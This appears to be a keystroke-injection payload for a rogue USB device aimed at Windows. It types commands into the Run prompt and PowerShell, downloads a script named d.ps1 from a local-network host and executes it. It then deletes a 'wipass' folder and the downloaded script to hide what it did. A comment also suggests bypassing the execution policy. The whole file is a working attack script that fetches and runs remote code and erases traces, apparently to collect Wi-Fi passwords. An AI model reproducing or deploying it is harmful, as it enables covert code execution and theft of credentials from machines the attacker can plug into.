llayout('es');            // Spanish keyboard layout
typingSpeed(10)    // Wait 10ms between keystrokes

delay(500)
// Opens the Windows Run prompt.
press("GUI r")
// Delays 0.2 seconds to give the Run prompt time to open.
delay(2000)
// this command will download the text and save as d.ps1 then run
// if the script failed to run change the ExecPolicy to Bypass
type("powershell")
delay(1000)
press("ENTER")
delay(1000)
type("wget http://172.16.0.1:8921/d.ps1 -o d.ps1")
delay(100)
press("ENTER")
type("./d.ps1")
delay(1000)
press("ENTER")
delay(10000)
press("CONTROL c")
delay(1000)
type("cd ..")
delay(1000)
press("ENTER")
delay(1000)
type("rmdir wipass")
delay(1000)
press("ENTER")
delay(1000)
type("S")
delay(1000)
press("ENTER")
delay(1000)
type("rm d.ps1")
delay(1000)
press("ENTER")
delay(1000)
type("exit")
delay(1000)
press("ENTER")
